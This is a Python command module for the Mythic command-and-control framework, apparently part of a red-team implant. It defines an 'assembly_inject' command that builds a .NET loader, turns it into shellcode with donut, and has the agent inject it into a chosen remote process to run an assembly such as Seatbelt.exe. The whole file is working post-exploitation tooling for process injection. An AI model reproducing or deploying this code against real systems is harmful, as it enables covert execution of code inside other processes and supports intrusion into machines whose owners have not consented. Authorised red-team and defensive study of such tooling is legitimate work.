from distutils.dir_util import copy_tree
import shutil
import tempfile
from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from os import path
from mythic_payloadtype_container.MythicRPC import *
import base64
import donut

EXEECUTE_ASSEMBLY_PATH = "/srv/ExecuteAssembly.exe"

class AssemblyInjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name = "PID",
                display_name = "Process ID",
                type=ParameterType.Number,
                description="Process ID to inject into.",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1,
                        group_name="Default",
                    )
                ]),
            CommandParameter(
                name="assembly_name",
                cli_name="Assembly",
                display_name="Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Assembly to execute (e.g., Seatbelt.exe).",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required=True,
                        ui_position=2,
                        group_name="Default",
                    ),
                ]),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required=False,
                        ui_position=3,
                        group_name="Default",
                    ),
                ]),
        ]

    async def get_files(self, callback: dict):
        file_resp = await MythicRPC().execute("get_file", callback_id=callback["id"],
                                              limit_by_callback=False,
                                              get_contents=False,
                                              filename="",
                                              max_results=-1)
        if file_resp.status == MythicRPCStatus.Success:
            file_names = []
            for f in file_resp.response:
                if f["filename"] not in file_names and f["filename"].endswith(".exe"):
                    file_names.append(f["filename"])
            return file_names
        else:
            return []

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=2)
            if len(parts) < 2:
                raise Exception("Invalid number of arguments.\n\tUsage: {}".format(AssemblyInjectCommand.help_cmd))
            pid = parts[0]
            assembly_name = parts[1]
            assembly_args = ""
            assembly_args = ""
            if len(parts) > 2:
                assembly_args = parts[2]
            self.args["pid"].value = pid
            self.args["assembly_name"].value = assembly_name
            self.args["assembly_arguments"].value = assembly_args
        


class AssemblyInjectCommand(CommandBase):
    cmd = "assembly_inject"
    needs_admin = False
    help_cmd = "assembly_inject [pid] [assembly] [args]"
    description = "Inject the unmanaged assembly loader into a remote process. The loader will then execute the .NET binary in the context of the injected process."
    version = 3
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = AssemblyInjectArguments
    attackmapping = ["T1055"]

    async def build_exeasm(self):
        global EXEECUTE_ASSEMBLY_PATH
        agent_build_path = tempfile.TemporaryDirectory()
        outputPath = "{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(agent_build_path.name)
        copy_tree(self.agent_code_path, agent_build_path.name)
        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/ExecuteAssembly/ExecuteAssembly.csproj".format(agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build ExecuteAssembly.exe:\n{}".format(stderr.decode()))
        shutil.copy(outputPath, EXEECUTE_ASSEMBLY_PATH)


    async def create_tasking(self, task: MythicTask) -> MythicTask:
        global EXEECUTE_ASSEMBLY_PATH
        task.args.add_arg("pipe_name",  str(uuid4()))
        if not path.exists(EXEECUTE_ASSEMBLY_PATH):
            await self.build_exeasm()
        
        donutPic = donut.create(file=EXEECUTE_ASSEMBLY_PATH, params=task.args.get_arg("pipe_name"))
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(donutPic).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
        
        task.display_params = "-PID {} -Assembly {} -Arguments {}".format(
            task.args.get_arg("pid"),
            task.args.get_arg("assembly_name"),
            task.args.get_arg("assembly_arguments")
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
